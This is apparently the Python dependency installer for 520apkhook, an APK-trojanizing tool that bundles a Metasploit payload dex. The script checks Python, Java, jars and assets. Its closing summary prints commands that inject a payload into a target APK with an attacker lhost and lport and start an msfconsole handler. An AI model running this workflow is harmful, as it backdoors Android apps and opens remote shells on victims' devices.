#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
520apkhook 一键安装脚本（Windows / Linux / macOS 通用）

    python install.py                 # 装齐全部依赖（pip 包 + Java 运行环境检查）
    python install.py --check         # 只体检，不装任何东西
    python install.py --venv          # 装进项目内的 .venv（推荐，不污染系统 Python）
    python install.py --install-java  # 没装 Java 时自动下载 Temurin JDK 到 tools/jdk
    python install.py --mirror tuna   # 用国内镜像装 pip 包（aliyun / tuna / ustc / auto）

脚本做的事：
  1. 检查 Python 版本（>= 3.8），必要时在项目里建 .venv；
  2. 安装 pip 依赖：rich（彩色输出）、pycryptodome（AES 加密 dex）；
  3. 找 Java（JAVA_HOME / PATH / 常见安装目录），版本 >= 11；找不到时可用
     --install-java 自动下载 Temurin JDK 到 <项目>/tools/jdk；
  4. 校验 libs/ 里的 baksmali.jar、smali.jar、apksigner.jar、壳 dex、keystore，
     并用 java -jar 实际加载一次，确认不是坏包；
  5. 生成 tools/env.sh、tools/env.bat（写好 JAVA_HOME / PATH / .venv 激活）；
  6. 冒烟测试：跑 `main.py --about`，打印各依赖的最终状态。

退出码：0 = 全部就绪；1 = 有缺失（--check 时同样以 1 表示缺依赖）；2 = 参数/环境致命错误。
"""

import argparse
import json
import os
import platform
import re
import shutil
import subprocess
import sys
import sysconfig
import tempfile
import textwrap
import time
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.join(HERE, 'tools')
VENV = os.path.join(HERE, '.venv')
JAVA_DIR = os.path.join(TOOLS, 'jdk')
REQ_PY = (3, 8)
JAVA_MIN = 11
JAVA_FEATURE = 17

PIP_DEPS = ['rich', 'pycryptodome']
JARS = ['baksmali.jar', 'smali.jar', 'apksigner.jar']
MIRRORS = {
    'auto': None,
    'none': None,
    'pypi': 'https://pypi.org/simple',
    'aliyun': 'https://mirrors.aliyun.com/pypi/simple',
    'tuna': 'https://pypi.tuna.tsinghua.edu.cn/simple',
    'ustc': 'https://mirrors.ustc.edu.cn/pypi/simple',
    'tencent': 'https://mirrors.cloud.tencent.com/pypi/simple',
}

IS_WIN = os.name == 'nt'


# --------------------------------------------------------------------------- 输出
class C:
    RESET = '' if IS_WIN and not os.environ.get('WT_SESSION') else '\033[0m'
    DIM = '' if not sys.stdout.isatty() else '\033[2m'
    RED = '' if not sys.stdout.isatty() else '\033[31m'
    GRN = '' if not sys.stdout.isatty() else '\033[32m'
    YEL = '' if not sys.stdout.isatty() else '\033[33m'
    CYA = '' if not sys.stdout.isatty() else '\033[36m'
    BOLD = '' if not sys.stdout.isatty() else '\033[1m'


def info(msg):
    print(f'{C.CYA}[*]{C.RESET} {msg}')


def ok(msg):
    print(f'{C.GRN}[+]{C.RESET} {msg}')


def warn(msg):
    print(f'{C.YEL}[!]{C.RESET} {msg}')


def fail(msg):
    print(f'{C.RED}[-]{C.RESET} {msg}')


def rule(title):
    print(f'\n{C.BOLD}== {title} =={C.RESET}')


def run(cmd, timeout=1800, cwd=None, env=None):
    """跑子进程，返回 (rc, 合并输出)。不抛异常，由调用方判断。"""
    try:
        proc = subprocess.run(
            cmd, cwd=cwd or HERE, env=env, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        out = proc.stdout.decode('utf-8', 'replace') if proc.stdout else ''
        return proc.returncode, out
    except FileNotFoundError as exc:
        return 127, str(exc)
    except subprocess.TimeoutExpired:
        return 124, 'timeout'
    except Exception as exc:  # noqa: BLE001
        return 1, str(exc)


# --------------------------------------------------------------------------- 体检项
class State:
    def __init__(self):
        self.items = []
        self.fatal = False

    def add(self, name, status, detail='', required=True):
        """status: ok / warn / fail / skip"""
        self.items.append({'name': name, 'status': status, 'detail': detail,
                           'required': required})
        mark = {'ok': f'{C.GRN}OK  {C.RESET}',
                'warn': f'{C.YEL}WARN{C.RESET}',
                'fail': f'{C.RED}FAIL{C.RESET}',
                'skip': f'{C.DIM}SKIP{C.RESET}'}[status]
        line = f'  {mark}  {name}'
        if detail:
            line += f'  {C.DIM}{detail}{C.RESET}'
        print(line)
        if status == 'fail' and required:
            self.fatal = True
        return status


def py_version_line():
    v = sys.version_info
    return f'{v.major}.{v.minor}.{v.micro}'


def check_python(state):
    v = sys.version_info
    if (v.major, v.minor) >= REQ_PY:
        return state.add('Python', 'ok', f'{py_version_line()} @ {sys.executable}')
    return state.add('Python', 'fail',
                     f'{py_version_line()} 低于要求 {REQ_PY[0]}.{REQ_PY[1]}+')


def venv_python(venv_dir=VENV):
    if IS_WIN:
        return os.path.join(venv_dir, 'Scripts', 'python.exe')
    return os.path.join(venv_dir, 'bin', 'python')


def check_pip(state, python_exe):
    rc, out = run([python_exe, '-m', 'pip', '--version'], timeout=120)
    if rc == 0:
        return state.add('pip', 'ok', out.strip().splitlines()[0] if out.strip() else '')
    return state.add('pip', 'fail', 'python -m pip 不可用（Linux 可能缺 python3-venv/pip）')


def installed_version(python_exe, module, dist=None):
    """先问包自己（__version__），再退回 importlib.metadata 的发行版版本。"""
    code = (
        'import importlib, json, sys\n'
        f'mod = importlib.import_module({module!r})\n'
        'v = getattr(mod, "__version__", None)\n'
        'if not v:\n'
        '    try:\n'
        '        from importlib.metadata import version\n'
        f'        v = version({(dist or module)!r})\n'
        '    except Exception:\n'
        '        v = "?"\n'
        'print(v)\n'
    )
    rc, out = run([python_exe, '-c', code], timeout=120)
    if rc == 0 and out.strip():
        return out.strip().splitlines()[-1].strip()
    return None


def check_pip_deps(state, python_exe):
    missing = []
    for mod, pipname in (('rich', 'rich'), ('Crypto', 'pycryptodome')):
        version = installed_version(python_exe, mod, pipname)
        if version:
            state.add(f'pip: {pipname}', 'ok', version)
        else:
            state.add(f'pip: {pipname}', 'warn', '未安装')
            missing.append(pipname)
    return missing


# --------------------------------------------------------------------------- Java
def parse_java_version(text):
    """从 `java -version` 输出里取主版本号：1.8 -> 8, 17.0.1 -> 17。"""
    m = re.search(r'version "(\d+)(?:\.(\d+))?', text)
    if not m:
        return None
    major = int(m.group(1))
    if major == 1 and m.group(2):
        return int(m.group(2))
    return major


def java_candidates():
    seen = []
    home = os.environ.get('JAVA_HOME')
    if home:
        seen.append(os.path.join(home, 'bin', 'java.exe' if IS_WIN else 'java'))
    which = shutil.which('java')
    if which:
        seen.append(which)
    if IS_WIN:
        roots = [r'C:\Program Files\Eclipse Adoptium', r'C:\Program Files\Java',
                 r'C:\Program Files\Microsoft', r'C:\Program Files\Zulu',
                 r'C:\Program Files\Amazon Corretto', r'C:\Program Files\BellSoft',
                 os.path.expanduser(r'~\scoop\apps\openjdk')]
        for root in roots:
            if not os.path.isdir(root):
                continue
            for name in sorted(os.listdir(root), reverse=True):
                seen.append(os.path.join(root, name, 'bin', 'java.exe'))
    else:
        for root in ('/usr/lib/jvm', '/usr/java', '/opt/java', '/opt'):
            if not os.path.isdir(root):
                continue
            for name in sorted(os.listdir(root), reverse=True):
                seen.append(os.path.join(root, name, 'bin', 'java'))
        seen.extend(['/usr/bin/java', '/usr/local/bin/java'])
    seen.append(os.path.join(JAVA_DIR, 'bin', 'java.exe' if IS_WIN else 'java'))
    out, uniq = [], set()
    for path in seen:
        path = os.path.normpath(path)
        if path in uniq:
            continue
        uniq.add(path)
        if os.path.isfile(path):
            out.append(path)
    return out


def probe_java(path):
    """返回 (feature_version, text)；跑不起来返回 (None, 错误信息)。"""
    rc, out = run([path, '-version'], timeout=120)
    text = (out or '').strip()
    if rc != 0 and not text:
        return None, 'cannot execute'
    if 'UnsupportedClassVersion' in text or "Error: Could not create" in text:
        return None, text.splitlines()[0]
    return parse_java_version(text), text.splitlines()[0] if text else ''


def find_java():
    """按优先级返回 (path, feature_version)。"""
    for path in java_candidates():
        feature, _line = probe_java(path)
        if feature and feature >= JAVA_MIN:
            return path, feature
    return None, None


def adoptium_url():
    if IS_WIN:
        os_name, arch = 'windows', ('x64' if platform.machine().endswith('64') else 'x86')
    elif sys.platform == 'darwin':
        os_name = 'mac'
        arch = 'aarch64' if platform.machine() in ('arm64', 'aarch64') else 'x64'
    else:
        os_name = 'linux'
        arch = 'aarch64' if platform.machine() in ('arm64', 'aarch64') else 'x64'
    return ('https://api.adoptium.net/v3/binary/latest/%d/ga/%s/%s/jdk/hotspot/normal/eclipse'
            % (JAVA_FEATURE, os_name, arch))


def download(url, dest, timeout=1800):
    import urllib.request

    info(f'下载 {url}')
    req = urllib.request.Request(url, headers={'User-Agent': 'apkhook-installer/1.0'})
    started = time.time()
    with urllib.request.urlopen(req, timeout=120) as resp, open(dest, 'wb') as fp:
        total = int(resp.headers.get('Content-Length') or 0)
        done = 0
        last = 0.0
        while True:
            chunk = resp.read(1 << 20)
            if not chunk:
                break
            fp.write(chunk)
            done += len(chunk)
            now = time.time()
            if now - last > 0.5:
                last = now
                pct = f'{done * 100 / total:5.1f}%' if total else f'{done >> 20} MB'
                sys.stdout.write(f'\r    {pct}  {done >> 20} MB  {now - started:4.0f}s ')
                sys.stdout.flush()
    sys.stdout.write('\r' + ' ' * 60 + '\r')
    if total and done != total:
        raise RuntimeError(f'下载不完整：{done}/{total} 字节')
    return dest


def extract_archive(path, destdir):
    """zip / tar.gz 解压后返回包含 bin/java 的那一层目录。"""
    os.makedirs(destdir, exist_ok=True)
    lower = path.lower()
    if lower.endswith(('.zip', '.jar')):
        with zipfile.ZipFile(path) as zf:
            zf.extractall(destdir)
    else:
        import tarfile
        with tarfile.open(path) as tf:
            tf.extractall(destdir)
    for name in os.listdir(destdir):
        candidate = os.path.join(destdir, name)
        if os.path.isdir(candidate) and os.path.isfile(
                os.path.join(candidate, 'bin', 'java.exe' if IS_WIN else 'java')):
            return candidate
    return destdir


def install_java(state, auto_accept=False):
    rule('安装 Java 运行环境（Temurin JDK %d）' % JAVA_FEATURE)
    if not auto_accept:
        answer = input('  没找到可用的 Java，是否下载 Temurin JDK %d 到 tools/jdk？[Y/n] '
                       % JAVA_FEATURE).strip().lower()
        if answer not in ('', 'y', 'yes'):
            state.add('Java', 'fail', '已取消下载；请手动安装 JDK 11+ 再运行本脚本')
            return None
    tmpdir = tempfile.mkdtemp(prefix='apkhook_jdk_')
    name = 'jdk.zip' if IS_WIN else 'jdk.tar.gz'
    archive = os.path.join(tmpdir, name)
    try:
        download(adoptium_url(), archive)
    except Exception as exc:  # noqa: BLE001
        state.add('Java', 'fail', f'下载失败：{exc}')
        warn('可手动下载：https://adoptium.net/temurin/releases/?version=%d' % JAVA_FEATURE)
        return None
    size_mb = os.path.getsize(archive) >> 20
    info(f'解压 {os.path.basename(archive)}（{size_mb} MB）…')
    try:
        root = extract_archive(archive, tmpdir)
    except Exception as exc:  # noqa: BLE001
        state.add('Java', 'fail', f'解压失败：{exc}')
        return None
    if os.path.isdir(JAVA_DIR):
        shutil.rmtree(JAVA_DIR, ignore_errors=True)
    os.makedirs(TOOLS, exist_ok=True)
    shutil.move(root, JAVA_DIR)
    java = os.path.join(JAVA_DIR, 'bin', 'java.exe' if IS_WIN else 'java')
    if not IS_WIN:
        os.chmod(java, 0o755)
    feature, line = probe_java(java)
    if not feature:
        state.add('Java', 'fail', f'下载的 JDK 无法运行：{line}')
        return None
    os.environ['JAVA_HOME'] = JAVA_DIR
    os.environ['PATH'] = os.path.join(JAVA_DIR, 'bin') + os.pathsep + os.environ.get('PATH', '')
    shutil.rmtree(tmpdir, ignore_errors=True)
    state.add('Java', 'ok', f'JDK {feature} -> tools/jdk')
    ok(f'已安装到 {JAVA_DIR}')
    return java


def check_java(state, install=False, auto_accept=False):
    path, feature = find_java()
    if path:
        state.add('Java', 'ok', f'{feature} · {path}')
        os.environ['JAVA_HOME'] = os.path.dirname(os.path.dirname(path))
        java_bin_dir = os.path.dirname(path)
        if java_bin_dir not in os.environ.get('PATH', '').split(os.pathsep):
            os.environ['PATH'] = java_bin_dir + os.pathsep + os.environ.get('PATH', '')
        return path

    # 可能是版本太低
    for candidate in java_candidates():
        feature, line = probe_java(candidate)
        if feature:
            state.add('Java', 'fail', f'{candidate} 版本 {feature} 低于 {JAVA_MIN}')
            break
    else:
        state.add('Java', 'warn', '未找到 java')

    if install:
        return install_java(state, auto_accept=auto_accept)
    warn('缺 Java：加 --install-java 自动装，或手动安装 JDK %d+ 后重跑' % JAVA_MIN)
    return None


# --------------------------------------------------------------------------- 项目自带资源
def check_jars(state, java):
    jar_dir = os.path.join(HERE, 'libs', 'jar')
    bad = []
    for name in JARS:
        path = os.path.join(jar_dir, name)
        if not os.path.isfile(path):
            state.add(f'libs/jar/{name}', 'fail', '缺失')
            bad.append(name)
            continue
        size = os.path.getsize(path)
        if size < 1024:
            state.add(f'libs/jar/{name}', 'fail', f'文件异常小（{size} B）')
            bad.append(name)
            continue
        if not java:
            state.add(f'libs/jar/{name}', 'ok', f'{size >> 10} KB（未校验加载）')
            continue
        # 真正用 java 加载一次：baksmali/smali 无参运行会打 usage 并退出非 0
        rc, out = run([java, '-jar', path], timeout=180)
        broken = ('Unable to access jarfile' in out or 'Invalid or corrupt jarfile' in out
                  or 'no main manifest attribute' in out.lower())
        if broken:
            state.add(f'libs/jar/{name}', 'fail', out.strip().splitlines()[0])
            bad.append(name)
        else:
            state.add(f'libs/jar/{name}', 'ok', f'{size >> 10} KB · 可加载')
    return bad


def check_assets(state):
    assets = [
        ('libs/ShellDexDir/classes.dex', 1024),
        ('libs/MsfDexDir/classes.dex', 1024),
        ('libs/520.keystore', 256),
    ]
    missing = []
    for rel, minimum in assets:
        path = os.path.join(HERE, rel)
        if not os.path.isfile(path):
            state.add(rel, 'fail', '缺失')
            missing.append(rel)
        elif os.path.getsize(path) < minimum:
            state.add(rel, 'fail', f'文件异常小（{os.path.getsize(path)} B）')
            missing.append(rel)
        else:
            state.add(rel, 'ok', f'{os.path.getsize(path) >> 10 or 1} KB')
    libs = os.path.join(HERE, 'libs', 'ShellDexDir', 'jni_lib')
    abis = sorted(d for d in os.listdir(libs) if os.path.isdir(os.path.join(libs, d))) \
        if os.path.isdir(libs) else []
    if abis:
        state.add('libs/ShellDexDir/jni_lib', 'ok', ', '.join(abis))
    else:
        state.add('libs/ShellDexDir/jni_lib', 'fail', '没有任何 ABI 目录')
        missing.append('jni_lib')
    return missing


# --------------------------------------------------------------------------- pip 安装
def ensure_venv(state, path=VENV):
    rule('准备 Python 虚拟环境')
    if not os.path.isfile(venv_python(path)):
        info(f'创建虚拟环境：{path}')
        rc, out = run([sys.executable, '-m', 'venv', path], timeout=600)
        if rc != 0:
            state.add('.venv', 'fail', '创建失败：' + (out.strip().splitlines() or [''])[0])
            warn('Linux 上可能需要先装 python3-venv：sudo apt install python3-venv')
            return None
        state.add('.venv', 'ok', '已创建')
    else:
        state.add('.venv', 'ok', '已存在')
    return venv_python(path)


def _is_chinese_locale():
    import locale
    hints = ' '.join([
        os.environ.get('LANG', ''), os.environ.get('LC_ALL', ''),
        os.environ.get('LANGUAGE', ''),
        str(locale.getdefaultlocale()[0] or ''),
    ]).lower()
    return any(tag in hints for tag in ('zh', 'china', 'chinese'))


def default_sources():
    """国内环境优先走镜像（pypi.org 经常超时），海外环境反之。"""
    pypi = 'https://pypi.org/simple'
    cn = [MIRRORS['aliyun'], MIRRORS['tuna'], MIRRORS['ustc'], pypi, None]
    intl = [pypi, MIRRORS['aliyun'], MIRRORS['tuna'], None]
    return cn if _is_chinese_locale() else intl


def pip_sources(mirror):
    """把用户指定的源排在最前，再补一串备选，最后退回 pip 默认配置。"""
    key = (mirror or 'auto').strip().lower()
    if key in ('none', 'pypi'):
        chosen = None if key == 'none' else MIRRORS['pypi']
        ordered = [chosen] if key == 'none' else [chosen, MIRRORS['aliyun'], None]
    elif key == 'auto':
        ordered = default_sources()
    else:
        chosen = MIRRORS.get(key, mirror)          # 也支持直接传 URL
        ordered = [chosen] + [s for s in default_sources() if s != chosen]
    out, seen = [], set()
    for source in ordered:
        if source in seen:
            continue
        seen.add(source)
        out.append(source)
    return out


def pip_install(state, python_exe, packages, mirror, upgrade=False):
    if not packages:
        return True
    rule('安装 pip 依赖')

    base = [python_exe, '-m', 'pip', 'install', '--disable-pip-version-check']
    if upgrade:
        base.append('--upgrade')
    last_out = ''
    for source in pip_sources(mirror):
        cmd = list(base) + list(packages)
        label = source or 'pip 默认源'
        if source:
            host = re.sub(r'^https?://', '', source).split('/')[0]
            cmd += ['-i', source, '--trusted-host', host]
        for attempt in (1, 2):
            info(f'pip install {" ".join(packages)}  <- {label}'
                 + ('' if attempt == 1 else '（重试）'))
            rc, out = run(cmd, timeout=1800)
            if rc == 0:
                state.add('pip install', 'ok', f'{", ".join(packages)} ({label})')
                return True
            last_out = out
            if 'No matching distribution' in out or 'Could not find a version' in out:
                break                    # 源里确实没有，重试没意义
        warn(f'{label} 失败，换下一个源')
    state.add('pip install', 'fail', (last_out.strip().splitlines() or [''])[-1])
    if 'externally-managed-environment' in last_out:
        warn('这是 PEP 668 保护：请用 --venv 装到项目虚拟环境里，'
             '或加 --break-system-packages 装到系统（不推荐）')
    elif 'proxy' in last_out.lower() or 'timed out' in last_out.lower():
        warn('像是网络问题：可试 --mirror aliyun（国内）或先设好 HTTPS_PROXY')
    return False


# --------------------------------------------------------------------------- 环境文件
def write_env_files(state, java, python_exe, venv_dir=None):
    rule('生成环境变量脚本')
    os.makedirs(TOOLS, exist_ok=True)
    java_home = os.path.dirname(os.path.dirname(java)) if java else ''
    venv_bin = os.path.dirname(python_exe) if venv_dir else ''

    sh_lines = ['#!/bin/sh', '# 由 install.py 生成：source tools/env.sh',
                f'# 520apkhook {time.strftime("%Y-%m-%d %H:%M:%S")}']
    if java_home:
        sh_lines += [f'export JAVA_HOME="{java_home}"',
                     'export PATH="$JAVA_HOME/bin:$PATH"']
    if venv_bin:
        sh_lines.append(f'. "{os.path.join(venv_dir, "bin", "activate")}"')
    sh_path = os.path.join(TOOLS, 'env.sh')
    with open(sh_path, 'w', encoding='utf-8', newline='\n') as fp:
        fp.write('\n'.join(sh_lines) + '\n')
    os.chmod(sh_path, 0o755)

    # .bat 用 ASCII 注释：cmd.exe 按 OEM 代码页读文件，中文注释会变乱码
    bat_lines = ['@echo off', 'REM generated by install.py -- call tools\\env.bat',
                 f'REM 520apkhook {time.strftime("%Y-%m-%d %H:%M:%S")}']
    if java_home:
        bat_lines += [f'set "JAVA_HOME={java_home}"',
                      'set "PATH=%JAVA_HOME%\\bin;%PATH%"']
    if venv_bin:
        bat_lines.append(f'call "{os.path.join(venv_dir, "Scripts", "activate.bat")}"')
    with open(os.path.join(TOOLS, 'env.bat'), 'w', encoding='utf-8', newline='\r\n') as fp:
        fp.write('\n'.join(bat_lines) + '\n')

    ps1_lines = ['# 由 install.py 生成：. .\\tools\\env.ps1']
    if java_home:
        ps1_lines += [f'$env:JAVA_HOME = "{java_home}"',
                      '$env:PATH = "$env:JAVA_HOME\\bin;$env:PATH"']
    if venv_bin:
        ps1_lines.append(f'. "{os.path.join(venv_dir, "Scripts", "Activate.ps1")}"')
    with open(os.path.join(TOOLS, 'env.ps1'), 'w', encoding='utf-8-sig') as fp:
        fp.write('\n'.join(ps1_lines) + '\n')

    state.add('tools/env.sh', 'ok', 'source tools/env.sh')
    state.add('tools/env.bat', 'ok', 'call tools\\env.bat')
    state.add('tools/env.ps1', 'ok', '. .\\tools\\env.ps1')


# --------------------------------------------------------------------------- 冒烟测试
def smoke_test(state, python_exe):
    rule('冒烟测试')
    rc, out = run([python_exe, os.path.join(HERE, 'main.py'), '--about'], timeout=300)
    if rc == 0 and 'BaoGuo' in out and 'huocai250' in out:
        version = re.search(r'v?(\d+\.\d+\.\d+)', out)
        state.add('main.py --about', 'ok', version.group(1) if version else '')
        return True
    first = (out.strip().splitlines() or ['(无输出)'])[-1]
    state.add('main.py --about', 'fail', first)
    return False


# --------------------------------------------------------------------------- 主流程
def summary(state, elapsed):
    rule('结果汇总')
    counts = {'ok': 0, 'warn': 0, 'fail': 0, 'skip': 0}
    for item in state.items:
        counts[item['status']] += 1
    print(f'  {C.GRN}{counts["ok"]} 通过{C.RESET} · '
          f'{C.YEL}{counts["warn"]} 警告{C.RESET} · '
          f'{C.RED}{counts["fail"]} 失败{C.RESET}  ({elapsed:.1f}s)')
    fails = [i for i in state.items if i['status'] == 'fail']
    if fails:
        print()
        for item in fails:
            fail(f'{item["name"]}：{item["detail"]}')
        return 1
    print()
    ok('依赖齐了，直接开跑：')
    for line in (
        'python main.py -n 目标.apk --analyze        # 先体检',
        'python main.py -n 目标.apk -m 4 -o out.apk  # 只修兼容性，不注入',
        'python main.py -n 目标.apk --lhost 1.2.3.4 --lport 4444',
        'msfconsole -r WorkDir/handler.rc',
    ):
        print(f'    {C.DIM}{line}{C.RESET}')
    return 0


def main(argv=None):
    parser = argparse.ArgumentParser(
        prog='install.py',
        description='520apkhook 一键安装依赖（Windows / Linux / macOS）',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
            示例:
              python install.py                     # 全自动安装
              python install.py --check             # 只体检
              python install.py --venv --mirror aliyun
              python install.py --install-java -y   # 缺 Java 时自动下载
              bash install.sh                       # Linux/macOS 包装脚本
              install.bat                           # Windows 包装脚本
        '''))
    parser.add_argument('--check', action='store_true', help='只体检，不安装任何东西')
    parser.add_argument('--venv', nargs='?', const=VENV, default=None, metavar='DIR',
                        help='在项目内创建/使用虚拟环境（默认 .venv）')
    parser.add_argument('--mirror', default='auto',
                        help='pip 源：auto/pypi/aliyun/tuna/ustc/tencent/none 或自定义 URL')
    parser.add_argument('--install-java', action='store_true',
                        help='没找到 Java 时自动下载 Temurin JDK 到 tools/jdk')
    parser.add_argument('--upgrade', action='store_true', help='pip 依赖强制升级到最新')
    parser.add_argument('-y', '--yes', action='store_true', help='所有交互都回答 yes')
    parser.add_argument('--json', action='store_true', help='额外把体检结果写成 tools/install-report.json')
    args = parser.parse_args(argv)

    started = time.time()
    print(f'{C.BOLD}520apkhook 依赖安装器{C.RESET}  '
          f'{C.DIM}{platform.system()} {platform.machine()} · Python {py_version_line()}{C.RESET}')
    print(f'{C.DIM}项目目录：{HERE}{C.RESET}')

    state = State()

    rule('环境体检')
    check_python(state)
    if state.fatal:
        fail('Python 版本不达标，先升级 Python 再运行本脚本')
        return 2

    target_python = sys.executable
    venv_dir = None
    if args.venv:
        venv_dir = args.venv
        target_python = ensure_venv(state, venv_dir) or sys.executable
        if not os.path.isfile(venv_python(venv_dir)):
            venv_dir = None

    check_pip(state, target_python)
    missing_pip = check_pip_deps(state, target_python)
    java = check_java(state, install=args.install_java, auto_accept=args.yes)
    check_jars(state, java)
    check_assets(state)

    if not args.check:
        if missing_pip:
            pip_install(state, target_python, missing_pip, args.mirror,
                        upgrade=args.upgrade)
            missing_pip = check_pip_deps(state, target_python)
        if not java and not args.install_java:
            warn('Java 缺失：加 --install-java 可自动装，或用 --java 指定路径')
        write_env_files(state, java, target_python, venv_dir)
        smoke_test(state, target_python)
    else:
        info('--check 模式：不做任何安装/写文件')

    if args.json:
        os.makedirs(TOOLS, exist_ok=True)
        path = os.path.join(TOOLS, 'install-report.json')
        with open(path, 'w', encoding='utf-8') as fp:
            json.dump({'when': time.strftime('%Y-%m-%d %H:%M:%S'),
                       'platform': platform.platform(),
                       'python': py_version_line(),
                       'items': state.items}, fp, ensure_ascii=False, indent=2)
        info(f'报告：{path}')

    code = 1 if any(i['status'] == 'fail' for i in state.items) else 0
    if args.check:
        if code == 0:
            ok('检查通过：依赖齐全')
        else:
            summary(state, time.time() - started)
        return code
    return summary(state, time.time() - started)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print('\n已中断')
        sys.exit(130)
